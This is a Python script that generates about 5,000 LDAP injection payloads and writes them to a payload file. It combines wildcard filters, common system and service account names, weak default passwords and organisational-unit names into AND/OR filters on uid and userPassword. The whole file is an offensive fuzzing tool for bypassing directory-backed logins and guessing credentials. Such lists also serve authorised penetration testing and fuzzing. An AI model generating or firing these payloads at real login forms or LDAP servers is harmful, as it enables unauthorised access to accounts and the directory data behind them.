#!/usr/bin/env python3
import os
import random

PAYLOAD_DIR = "payloads"
os.makedirs(PAYLOAD_DIR, exist_ok=True)

def generate_ldap():
    p = set()

    # ========== 1. BASIC WILDCARD (50+) ==========
    wildcards = [
        "*", "admin", "admin*", "*admin", "admin*admin",
        "(&(uid=*)(userPassword=*))",
        "(&(uid=admin)(userPassword=*))",
        "(|(uid=*)(userPassword=*))",
        "(|(uid=admin)(userPassword=*))",
        "(!(uid=*))", "(!(uid=admin))",
        "(&(objectClass=*)(uid=*))",
        "(&(objectClass=person)(uid=*))",
        "(&(objectClass=user)(uid=*))",
        "(&(objectClass=inetOrgPerson)(uid=*))",
        "(&(objectClass=organizationalPerson)(uid=*))",
        "(&(objectClass=posixAccount)(uid=*))",
        "(|(objectClass=*)(uid=*))",
        "(|(objectClass=person)(uid=*))",
        "(|(objectClass=user)(uid=*))",
        "(|(objectClass=inetOrgPerson)(uid=*))",
        "(|(objectClass=organizationalPerson)(uid=*))",
        "(|(objectClass=posixAccount)(uid=*))"
    ]
    p.update(wildcards)

    # ========== 2. UID VARIATIONS (100+) ==========
    uids = [
        "admin", "root", "user", "test", "guest", "anonymous",
        "apache", "www-data", "nobody", "daemon", "bin", "sys",
        "sync", "games", "man", "lp", "mail", "news", "uucp",
        "proxy", "backup", "list", "irc", "gnats", "systemd-network",
        "systemd-resolve", "messagebus", "syslog", "_apt", "uuidd",
        "tcpdump", "sshd", "administrator", "webmaster", "postmaster",
        "abuse", "hostmaster", "usenet", "postfix", "smmsp", "spam",
        "clamav", "amavis", "debian", "ubuntu", "centos", "fedora",
        "redhat", "arch", "gentoo", "slackware", "opensuse",
        "debian-sys-maint", "mysql", "postgres", "redis", "mongodb",
        "elasticsearch", "kibana", "logstash", "grafana", "prometheus",
        "node_exporter", "blackbox_exporter", "alertmanager",
        "consul", "vault", "nomad", "terraform", "packer", "vagrant",
        "docker", "kubernetes", "kube", "etcd", "flannel", "calico",
        "weave", "istio", "envoy", "linkerd"
    ]
    for uid in uids:
        p.add(f"(uid={uid})")
        p.add(f"(uid={uid}*)")
        p.add(f"(uid=*{uid})")
        p.add(f"(uid=*{uid}*)")

    # ========== 3. PASSWORD VARIATIONS (100+) ==========
    passwords = [
        "password", "123456", "admin", "root", "test", "guest",
        "anonymous", "secret", "pass", "password123", "admin123",
        "root123", "test123", "guest123", "letmein", "welcome",
        "hello", "changeme", "default", "blank", "null", "empty",
        "123", "abc", "xyz", "qwerty", "monkey", "dragon", "master",
        "login", "12345", "12345678", "123456789", "1234567890",
        "pass123", "secret123", "welcome123", "hello123",
        "changeme123", "default123", "blank123", "null123", "empty123"
    ]
    for pwd in passwords:
        p.add(f"(userPassword={pwd})")
        p.add(f"(userPassword=*{pwd})")
        p.add(f"(userPassword={pwd}*)")
        p.add(f"(userPassword=*{pwd}*)")

    # ========== 4. OU VARIATIONS (100+) ==========
    ous = [
        "admin", "users", "groups", "people", "system", "services",
        "applications", "devices", "network", "servers", "workstations",
        "printers", "scanners", "storage", "backup", "security",
        "audit", "compliance", "legal", "hr", "finance", "sales",
        "marketing", "it", "engineering", "operations", "support",
        "consulting", "management", "executive", "board", "shareholders",
        "investors", "partners", "customers", "vendors", "suppliers",
        "contractors", "employees", "staff", "team", "department",
        "unit", "division", "group", "squad", "tribe", "chapter",
        "guild", "center", "hub", "node", "cluster", "region",
        "zone", "area", "site", "location", "building", "floor",
        "room", "desk", "station", "terminal", "console", "client",
        "server", "host", "domain", "forest", "tree", "root", "dc",
        "cn", "o", "ou", "c", "st", "l", "street", "postalCode",
        "telephoneNumber", "mail", "givenName", "sn", "displayName",
        "title", "description", "comment", "seeAlso", "member",
        "owner", "manager", "secretary", "assistant", "directReport",
        "employeeType", "employeeNumber", "departmentNumber",
        "roomNumber", "carLicense", "jpegPhoto", "thumbnailPhoto",
        "photo", "userCertificate"
    ]
    for ou in ous:
        p.add(f"(ou={ou})")
        p.add(f"(ou={ou}*)")
        p.add(f"(ou=*{ou})")
        p.add(f"(ou=*{ou}*)")

    # ========== 5. COMBINED PAYLOAD (500+) ==========
    for uid in uids[:20]:
        for pwd in passwords[:20]:
            p.add(f"(&(uid={uid})(userPassword={pwd}))")
            p.add(f"(|(uid={uid})(userPassword={pwd}))")
            p.add(f"(&(uid={uid})(userPassword=*{pwd}))")
            p.add(f"(|(uid={uid})(userPassword=*{pwd}))")
            p.add(f"(&(uid=*{uid})(userPassword={pwd}))")
            p.add(f"(|(uid=*{uid})(userPassword={pwd}))")

    # ========== 6. RANDOM (1000+) ==========
    while len(p) < 5000:
        uid = random.choice(uids)
        pwd = random.choice(passwords)
        ou = random.choice(ous)
        p.add(f"(&(uid={uid})(userPassword={pwd}))")
        p.add(f"(|(uid={uid})(userPassword={pwd}))")
        p.add(f"(&(ou={ou})(uid={uid}))")
        p.add(f"(|(ou={ou})(uid={uid}))")
        p.add(f"(&(uid={uid})(userPassword=*))")
        p.add(f"(|(uid={uid})(userPassword=*))")
        p.add(f"(&(uid=*)(userPassword={pwd}))")
        p.add(f"(|(uid=*)(userPassword={pwd}))")
        p.add(f"(&(uid={uid})(objectClass=*))")
        p.add(f"(|(uid={uid})(objectClass=*))")

    # ========== 7. SAVE ==========
    with open(os.path.join(PAYLOAD_DIR, "ldap.txt"), "w", encoding="utf-8") as f:
        f.write("\n".join(p))
    print(f"[+] ldap.txt: {len(p)} payloads")

if __name__ == "__main__":
    generate_ldap()